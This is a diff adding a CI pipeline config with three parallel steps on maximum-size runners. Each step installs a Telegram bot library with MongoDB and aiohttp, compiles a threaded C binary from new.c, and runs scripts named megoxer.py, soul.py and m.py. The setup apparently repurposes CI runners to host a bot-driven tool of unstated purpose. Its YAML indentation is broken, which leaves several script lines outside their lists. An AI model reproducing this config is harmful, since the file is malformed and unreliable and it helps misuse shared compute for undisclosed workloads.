@@ -1,0 +1,31 @@
+pipelines:
+  default:
+    - parallel:
+        - step:
+            name: Run megoxer.py
+            image: python:3.10
+            size: 8x
+            script:
+              - echo "Running megoxer.py on the first machine..."
+              - pip install telebot pymongo aiohttp
+             - gcc -o rs new.c -pthread
+          - python3 megoxer.py
+
+        - step:
+            name: Run soul.py
+            image: python:3.10
+            size: 8x
+            script:
+              - echo "Running soul.py on the second machine..."
+              - pip install telebot pymongo aiohttp
+              - gcc -o rs new.c -pthread
+          - python3 soul.py
+        - step:
+            name: Run m.py
+            image: python:3.10
+            size: 8x
+            script:
+              - echo "Running m.py on the second machine..."
+              - pip install telebot pymongo aiohttp
+              - gcc -o rs new.c -pthread
+          - python3 m.py
